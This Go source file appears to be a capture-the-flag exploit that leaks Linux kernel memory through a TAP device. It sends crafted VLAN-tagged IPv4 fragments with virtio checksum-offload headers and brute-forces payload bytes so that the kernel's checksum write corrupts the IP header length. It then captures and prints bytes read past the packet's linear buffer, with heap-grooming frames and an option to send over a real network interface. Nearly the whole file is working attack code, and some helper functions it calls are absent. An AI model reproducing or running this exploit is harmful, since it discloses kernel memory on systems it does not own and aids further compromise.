package main

import (
	"encoding/binary"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"net"
	"os"
	"sort"
	"syscall"
	"time"
	"unsafe"
)

const (
	iffTap       = 0x0002
	iffNoPI      = 0x1000
	iffVnetHdr   = 0x4000
	tunSetIFF    = 0x400454ca
	tunSetSndBuf = 0x400454d4
	needsCsum    = 1

	ethLen     = 14
	vlanLen    = 4
	ipLen      = 20
	l2Len      = ethLen + vlanLen + vlanLen
	csumAtIP   = l2Len
	vlanProto  = 0x8100
	ipProtoEth = 0x0800

	fragPayload = 8
	restPayload = 400
	marker      = 0xa5
	ipID        = 0x9999
)

func main() {
	if os.Geteuid() != 0 {
		fmt.Fprintln(os.Stderr, "run as root")
		os.Exit(1)
	}
	cfg := parseCfg()
	if err := run(cfg); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}

type cfg struct {
	head       int
	rest       int
	tebar      int
	tebarFill  byte
	capture    time.Duration
	count      int
	page       bool
	skipVerify bool
	egress     bool
	egressRest int
	iface      string
	dst        string
	src        string
	gateway    string
	dstMAC     string
	egressWait time.Duration
	transport  string
	udpPort    int
}

func parseCfg() cfg {
	c := cfg{}
	flag.IntVar(&c.head, "head", 8, "offset-0 fragment payload; this skb is the linear head (multiple of 8)")
	flag.IntVar(&c.rest, "rest", 400, "payload carried in the completing fragment")
	flag.IntVar(&c.tebar, "tebar", 0, "same-sized frames to allocate immediately before the head skb")
	fill := flag.Int("tebar-fill", 0xee, "byte stored in tebar frames")
	captureMs := flag.Int("capture-ms", 800, "time to collect output fragments")
	flag.IntVar(&c.count, "count", 1, "number of samples; batches buffer output until all samples finish")
	flag.BoolVar(&c.page, "page", false, "force a page_frag head (TUNSETSNDBUF=INT_MAX, nonblocking write)")
	flag.BoolVar(&c.skipVerify, "skip-verify", false, "skip the single-datagram header rewrite check")
	flag.BoolVar(&c.egress, "egress", false, "send the fragment sequence through a real virtio-net interface")
	flag.IntVar(&c.egressRest, "egress-rest", 4000, "payload after the short head in egress mode")
	flag.StringVar(&c.iface, "iface", "eth0", "egress interface")
	flag.StringVar(&c.dst, "dst", "chall.itsbengsky.id", "egress IPv4 destination or hostname")
	flag.StringVar(&c.src, "src", "", "source IPv4 override (default: interface address)")
	flag.StringVar(&c.gateway, "gateway", "", "next-hop IPv4 override (default: /proc/net/route)")
	flag.StringVar(&c.dstMAC, "dst-mac", "", "next-hop MAC override (default: /proc/net/arp)")
	flag.StringVar(&c.transport, "egress-transport", "udp", "egress carrier: udp or raw253")
	flag.IntVar(&c.udpPort, "udp-port", 9, "closed destination port used by the UDP carrier")
	egressWaitMs := flag.Int("egress-wait-ms", 5000, "time to collect ICMP quotations in egress mode")
	flag.Parse()
	c.tebarFill = byte(*fill)
	c.capture = time.Duration(*captureMs) * time.Millisecond
	c.egressWait = time.Duration(*egressWaitMs) * time.Millisecond
	if c.head < 8 || c.head%8 != 0 || c.head > 40 {
		fmt.Fprintln(os.Stderr, "-head must be a multiple of 8 in 8..40")
		os.Exit(1)
	}
	if c.rest < 16 {
		fmt.Fprintln(os.Stderr, "-rest must be at least 16")
		os.Exit(1)
	}
	if c.capture <= 0 {
		fmt.Fprintln(os.Stderr, "-capture-ms must be positive")
		os.Exit(1)
	}
	if c.count <= 0 {
		fmt.Fprintln(os.Stderr, "-count must be positive")
		os.Exit(1)
	}
	if c.egressRest < 64 || c.head+c.egressRest > 65515 {
		fmt.Fprintln(os.Stderr, "-egress-rest must produce an IPv4 datagram of 84..65535 bytes")
		os.Exit(1)
	}
	if c.egressWait <= 0 {
		fmt.Fprintln(os.Stderr, "-egress-wait-ms must be positive")
		os.Exit(1)
	}
	if c.transport != "udp" && c.transport != "raw253" {
		fmt.Fprintln(os.Stderr, "-egress-transport must be udp or raw253")
		os.Exit(1)
	}
	if c.transport == "udp" && c.head != 8 {
		fmt.Fprintln(os.Stderr, "UDP egress transport requires -head 8")
		os.Exit(1)
	}
	if c.udpPort < 1 || c.udpPort > 65535 {
		fmt.Fprintln(os.Stderr, "-udp-port must be in 1..65535")
		os.Exit(1)
	}
	return c
}

func run(c cfg) error {
	if c.egress {
		return runEgress(c)
	}
	tapName := getenv("PWN_TAP", "bengskytap")
	capName := getenv("PWN_CAP", "bengskyv1")
	if _, err := net.InterfaceByName(tapName); err != nil {
		return fmt.Errorf("tap %s is not present: %w", tapName, err)
	}
	if _, err := net.InterfaceByName(capName); err != nil {
		return fmt.Errorf("capture iface %s is missing: %w", capName, err)
	}
	tap, err := openTap(tapName, c.page)
	if err != nil {
		return fmt.Errorf("attach %s: %w", tapName, err)
	}
	defer tap.Close()

	cap, err := listen(capName)
	if err != nil {
		return err
	}
	defer cap.Close()

	if !c.skipVerify {
		if err := verifyWrite(tap, cap); err != nil {
			return err
		}
	}
	seen := make(map[string][]byte)
	verbose := c.count == 1
	for i := 0; i < c.count; i++ {
		leaks, err := bali(tap, cap, c, verbose)
		if err != nil {
			return err
		}
		for _, leak := range leaks {
			seen[string(leak)] = leak
		}
	}
	if !verbose {
		keys := make([]string, 0, len(seen))
		for key := range seen {
			keys = append(keys, key)
		}
		sort.Strings(keys)
		for _, key := range keys {
			leak := seen[key]
			fmt.Printf("past-linear hex=%s ascii=%q\n", hex.EncodeToString(leak), string(leak))
		}
	}
	return nil
}

func verifyWrite(tap *os.File, cap *capture) error {
	payload := bytesRepeat(300, 0x5a)
	if !testo(payload, 0x1111) {
		return errors.New("solver found no 0x4f00 adjustment")
	}
	pkt := datagram(0x1111, payload)
	if err := writeTap(tap, frame(pkt), true, csumAtIP); err != nil {
		return err
	}
	got := cap.collect(500*time.Millisecond, 0x1111)
	if len(got) == 0 {
		return errors.New("verify: no fragment captured")
	}
	fmt.Printf("verify: first byte 0x%02x ihl=%d hdr=%s\n",
		got[0][0], got[0][0]&0x0f, hex.EncodeToString(got[0][:min(20, len(got[0]))]))
	if got[0][0] != 0x4f {
		return fmt.Errorf("verify: wanted 0x4f, got 0x%02x", got[0][0])
	}
	return nil
}

func bali(tap *os.File, cap *capture, c cfg, verbose bool) ([][]byte, error) {
	payload := make([]byte, c.head+c.rest)
	for i := range payload {
		payload[i] = 0x11
	}
	proto := byte(ipProtoRaw)
	if c.transport == "udp" {
		proto = ipProtoUDP
		egressUDPHeaders(payload, uint16(c.udpPort))
	} else {
		for i := 0; i < c.head; i++ {
			payload[i] = marker
		}
	}
	src := net.ParseIP("10.0.0.2").To4()
	dst := net.ParseIP("10.99.0.2").To4()
	if !egressSolve(payload, ipID, src, dst, proto) {
		return nil, errors.New("solver found no 0x4f00 adjustment")
	}
	if verbose {
		printHead(c)
	}
	second := frame(egressFragment(c.head, false, payload[c.head:], ipID, src, dst, proto))
	if err := writeTap(tap, second, true, l2Len+ipLen); err != nil {
		return nil, err
	}
	tebar := frame(datagram(0x1000, bytesRepeat(c.head, c.tebarFill)))
	for i := 0; i < c.tebar; i++ {
		if err := writeTap(tap, tebar, false, 0); err != nil {
			return nil, err
		}
	}
	first := frame(egressFragment(0, true, payload[:c.head], ipID, src, dst, proto))
	if err := writeTap(tap, first, true, csumAtIP); err != nil {
		return nil, err
	}
	pkts := cap.collect(c.capture, ipID)
	if len(pkts) == 0 {
		return nil, errors.New("no fragment captured")
	}
	var leaks [][]byte
	var balied, mutated bool
	for i, ip := range pkts {
		ihl := int(ip[0]&0x0f) * 4
		if verbose {
			fmt.Printf("frag %d first=0x%02x ihl_bytes=%d tot=%d\n",
				i, ip[0], ihl, binary.BigEndian.Uint16(ip[2:]))
		}
		if ip[0] != 0x4f {
			continue
		}
		mutated = true
		extra := ip[ipLen:ihl]
		if verbose {
			fmt.Printf("  options %d bytes: %s\n", len(extra), hex.EncodeToString(extra))
			if ip[9] == ipProtoUDP && binary.BigEndian.Uint16(ip[6:])&0x1fff == 0 && len(ip) >= ihl+8 {
				udp := ip[ihl : ihl+8]
				fmt.Printf("  post-mutation udp src=%d dst=%d len=%d checksum=0x%04x\n",
					binary.BigEndian.Uint16(udp[0:2]), binary.BigEndian.Uint16(udp[2:4]),
					binary.BigEndian.Uint16(udp[4:6]), binary.BigEndian.Uint16(udp[6:8]))
			}
		}
		host := extra[c.head:]
		leaks = append(leaks, append([]byte(nil), host...))
		nonzero := 0
		for _, b := range host {
			if b != 0 {
				nonzero++
			}
		}
		if len(host) > 0 {
			balied = true
		}
		if verbose {
			fmt.Printf("  past-linear hex=%s ascii=%q nonzero=%d/%d\n",
				hex.EncodeToString(host), string(host), nonzero, len(host))
		}
	}
	if verbose {
		switch {
		case balied:
			fmt.Println("123")
		case mutated:
			fmt.Println("456")
		default:
			fmt.Println("678")
		}
	}
	return leaks, nil
}

func testo(payload []byte, id uint16) bool {
	const adj = 32
	if adj+1 >= ipLen+len(payload) {
		return false
	}
	off := adj - ipLen
	for w := 0; w < 65536; w++ {
		payload[off] = byte(w)
		payload[off+1] = byte(w >> 8)
		pkt := datagram(id, payload)
		forwardTTL(pkt)
		if csumFold(csumPartial(pkt)) == 0x004f {
			return true
		}
	}
	return false
}

func datagram(id uint16, payload []byte) []byte {
	return fragment(0, false, payload, id)
}

func fragment(offset int, more bool, payload []byte, idOpt ...uint16) []byte {
	id := uint16(ipID)
	if len(idOpt) > 0 {
		id = idOpt[0]
	}
	pkt := make([]byte, ipLen+len(payload))
	pkt[0] = 0x45
	binary.BigEndian.PutUint16(pkt[2:], uint16(len(pkt)))
	binary.BigEndian.PutUint16(pkt[4:], id)
	off := uint16(offset / 8)
	if more {
		off |= 0x2000
	}
	binary.BigEndian.PutUint16(pkt[6:], off)
	pkt[8] = 64
	pkt[9] = 253
	copy(pkt[12:16], net.ParseIP("10.0.0.2").To4())
	copy(pkt[16:20], net.ParseIP("10.99.0.2").To4())
	copy(pkt[ipLen:], payload)
	binary.BigEndian.PutUint16(pkt[10:], ipChecksum(pkt[:ipLen]))
	return pkt
}

func forwardTTL(pkt []byte) {
	raw := uint32(pkt[10]) | uint32(pkt[11])<<8
	raw += 0x0001
	if raw >= 0xFFFF {
		raw++
	}
	pkt[8]--
	pkt[10] = byte(raw)
	pkt[11] = byte(raw >> 8)
}
func frame(ip []byte) []byte {
	f := make([]byte, l2Len+len(ip))
	copy(f[0:6], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x01})
	copy(f[6:12], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x02})
	binary.BigEndian.PutUint16(f[12:], vlanProto)
	binary.BigEndian.PutUint16(f[14:], 0)
	binary.BigEndian.PutUint16(f[16:], vlanProto)
	binary.BigEndian.PutUint16(f[18:], 0)
	binary.BigEndian.PutUint16(f[20:], ipProtoEth)
	copy(f[l2Len:], ip)
	return f
}

func writeTap(tap *os.File, frame []byte, csum bool, start uint16) error {
	buf := make([]byte, 10+len(frame))
	if csum {
		buf[0] = needsCsum
		binary.LittleEndian.PutUint16(buf[6:], start)
	}
	copy(buf[10:], frame)
	for {
		_, err := tap.Write(buf)
		if err == nil || !errors.Is(err, syscall.EAGAIN) {
			return err
		}
		time.Sleep(time.Millisecond)
	}
}

type capture struct{ fd int }

func listen(ifname string) (*capture, error) {
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(syscall.ETH_P_ALL)))
	if err != nil {
		return nil, err
	}
	ifi, err := net.InterfaceByName(ifname)
	if err != nil {
		syscall.Close(fd)
		return nil, err
	}
	if err := syscall.Bind(fd, &syscall.SockaddrLinklayer{Protocol: htons(syscall.ETH_P_ALL), Ifindex: ifi.Index}); err != nil {
		syscall.Close(fd)
		return nil, err
	}
	syscall.SetsockoptTimeval(fd, syscall.SOL_SOCKET, syscall.SO_RCVTIMEO, &syscall.Timeval{Usec: 5000})
	return &capture{fd: fd}, nil
}

func (c *capture) Close() { syscall.Close(c.fd) }

func (c *capture) collect(d time.Duration, id uint16) [][]byte {
	deadline := time.Now().Add(d)
	var out [][]byte
	buf := make([]byte, 65536)
	for time.Now().Before(deadline) {
		n, _, err := syscall.Recvfrom(c.fd, buf, 0)
		if err != nil {
			if errors.Is(err, syscall.EAGAIN) || errors.Is(err, syscall.EWOULDBLOCK) {
				continue
			}
			break
		}
		ip := ipv4Of(buf[:n])
		if ip == nil || binary.BigEndian.Uint16(ip[4:]) != id {
			continue
		}
		out = append(out, append([]byte(nil), ip...))
	}
	return out
}

func ipv4Of(frame []byte) []byte {
	if len(frame) < ethLen {
		return nil
	}
	off := ethLen
	proto := binary.BigEndian.Uint16(frame[12:])
	for proto == vlanProto {
		if len(frame) < off+vlanLen {
			return nil
		}
		proto = binary.BigEndian.Uint16(frame[off+2:])
		off += vlanLen
	}
	if proto != ipProtoEth || len(frame) < off+ipLen {
		return nil
	}
	return frame[off:]
}

func openTap(name string, page bool) (*os.File, error) {
	flags := os.O_RDWR
	if page {
		flags |= syscall.O_NONBLOCK
	}
	f, err := os.OpenFile("/dev/net/tun", flags, 0)
	if err != nil {
		return nil, err
	}
	var req [64]byte
	copy(req[:], name)
	*(*uint16)(unsafe.Pointer(&req[16])) = iffTap | iffNoPI | iffVnetHdr
	if _, _, errno := syscall.Syscall(syscall.SYS_IOCTL, f.Fd(), tunSetIFF, uintptr(unsafe.Pointer(&req[0]))); errno != 0 {
		f.Close()
		return nil, fmt.Errorf("TUNSETIFF: %w", errno)
	}
	if page {
		snd := int32(0x7fffffff)
		if _, _, errno := syscall.Syscall(syscall.SYS_IOCTL, f.Fd(), tunSetSndBuf, uintptr(unsafe.Pointer(&snd))); errno != 0 {
			f.Close()
			return nil, fmt.Errorf("TUNSETSNDBUF: %w", errno)
		}
	}
	return f, nil
}

func printHead(c cfg) {
	frameLen := l2Len + ipLen + c.head
	past := 60 - (ipLen + c.head)
	via := "slab skb (tun_alloc_skb)"
	if c.page {
		via = "page_frag skb (tun_build_skb)"
	}
	fmt.Printf("head: payload=%d frame=%d linear_after_strip=%d copy=60 past_headlen=%d via=%s tebar=%d fill=0x%02x\n",
		c.head, frameLen, ipLen+c.head, past, via, c.tebar, c.tebarFill)
}

func ipChecksum(h []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(h); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(h[i:]))
	}
	for sum > 0xffff {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

func csumPartial(b []byte) uint32 {
	var sum uint32
	i := 0
	for ; i+1 < len(b); i += 2 {
		sum += uint32(b[i]) | uint32(b[i+1])<<8
	}
	if i < len(b) {
		sum += uint32(b[i])
	}
	return sum
}

func csumFold(sum uint32) uint16 {
	sum = (sum & 0xffff) + (sum >> 16)
	sum = (sum & 0xffff) + (sum >> 16)
	return ^uint16(sum)
}

func bytesRepeat(n int, b byte) []byte {
	p := make([]byte, n)
	for i := range p {
		p[i] = b
	}
	return p
}

func getenv(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}

func htons(v uint16) uint16 { return v<<8 | v>>8 }
